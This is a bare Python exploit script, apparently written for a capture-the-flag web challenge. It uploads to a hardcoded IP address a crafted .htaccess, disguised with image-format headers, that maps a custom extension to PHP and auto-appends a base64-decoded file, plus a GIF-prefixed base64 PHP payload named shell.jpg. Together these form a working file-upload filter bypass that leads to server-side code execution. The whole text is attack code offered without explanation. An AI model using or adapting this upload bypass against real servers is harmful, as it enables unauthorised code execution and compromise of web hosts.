import requests
import base64

htaccess = b"""
#define width 1337
#define height 1337 
AddType application/x-httpd-php .abc
php_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_fd40c7f4125a9b9ff1a4e75d293e3080/shell.abc"
"""
shell = b"GIF89a12" + base64.b64encode(b"<?php phpinfo();?>")
url = "http://183.129.189.60:10052/"

# files = {'file':('.htaccess',htaccess,'image/jpeg')}
# data = {"upload":"Submit"}
# response = requests.post(url=url, data=data, files=files)
# print(response.text)


files = {'file':('shell.jpg',shell,'image/jpeg')}
response = requests.post(url=url, files=files)
print(response.text)